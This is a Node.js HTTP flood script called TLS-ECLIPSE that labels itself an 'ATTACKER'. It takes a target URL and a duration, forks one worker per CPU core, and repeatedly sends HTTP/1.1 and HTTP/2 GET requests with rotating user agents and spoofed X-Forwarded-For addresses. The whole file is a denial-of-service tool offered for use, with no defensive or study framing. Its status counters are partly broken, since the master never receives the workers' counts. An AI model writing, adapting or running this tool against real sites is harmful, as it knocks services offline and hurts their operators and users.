// TLS-ECLIPSE.js
const http = require('http');
const http2 = require('http2');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const { performance } = require('perf_hooks');

if (process.argv.length !== 4) {
    console.log(`Usage: node TLS-ECLIPSE.js <target> <duration-in-seconds>`);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);

const parsed = url.parse(target);
const host = parsed.host;
const path = parsed.path || '/';
const port = 443;
const cores = os.cpus().length;
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    // Add more for variety
];

let h2RequestsSent = 0;
let h1RequestsSent = 0;
let totalRequests = 0;
let startTime = performance.now();

function randIP() {
    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function sendHttp2Request(client) {
    const headers = {
        ':method': 'GET',
        ':path': path,
        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'x-forwarded-for': randIP(),
        'accept': '*/*',
    };
    const req = client.request(headers);
    req.on('response', () => {});  // Ignore response
    req.end();
    h2RequestsSent++;
}

function sendHttp1Request() {
    const options = {
        hostname: host,
        port: 80,
        path: path,
        method: 'GET',
        headers: {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'X-Forwarded-For': randIP(),
            'Connection': 'keep-alive',
        },
    };

    const req = http.request(options, (res) => {
        res.on('data', () => {}); // Ignore data
    });

    req.end();
    h1RequestsSent++;
}

if (cluster.isMaster) {
    console.log(`======================================`);
    console.log(`         TLS-ECLIPSE ATTACKER`);
    console.log(`======================================`);
    console.log(`[+] Target     : ${target}`);
    console.log(`[+] Duration   : ${duration}s`);
    console.log(`[+] Cores Used : ${cores}`);
    console.log(`======================================`);

    for (let i = 0; i < cores; i++) {
        cluster.fork();
    }

    const attackDuration = duration * 1000; // Attack duration in milliseconds

    setInterval(() => {
        const timeElapsed = Math.floor((performance.now() - startTime) / 1000);
        const timeLeft = duration - timeElapsed;

        console.clear();
        console.log(`======================================`);
        console.log(`[+] Attack Running...`);
        console.log(`======================================`);
        console.log(`[+] H2 Requests Sent: ${h2RequestsSent}`);
        console.log(`[+] H1 Requests Sent: ${h1RequestsSent}`);
        console.log(`[+] Time Left: ${timeLeft}s`);
        console.log(`======================================`);
    }, 1000);

    setTimeout(() => {
        console.log(`\n[+] Attack Ended`);
        process.exit(1);
    }, attackDuration);
} else {
    const maxStreams = 3;  // Max number of HTTP/2 streams at a time
    let activeStreams = 0;

    function attack() {
        if (activeStreams < maxStreams) {
            // Choose HTTP/2 or HTTP/1.1 randomly
            if (Math.random() < 0.5) {
                const client = http2.connect(`https://${host}`);
                client.on('error', (err) => console.error(err));

                sendHttp2Request(client);
                activeStreams++;
                setTimeout(() => {
                    client.close();  // Close after request
                    activeStreams--;
                }, 100); // Allow time for server to handle requests
            } else {
                sendHttp1Request();
            }
        }
        totalRequests++;
    }

    // Real RPS - Adjust this to your desired rate per second
    const rps = 100;  // 100 requests per second
    setInterval(attack, 1000 / rps); // Delay between requests to achieve the desired RPS

    process.on('exit', () => {
        console.log(`[+] Worker PID: ${process.pid} sent ~${totalRequests} total requests`);
    });
}
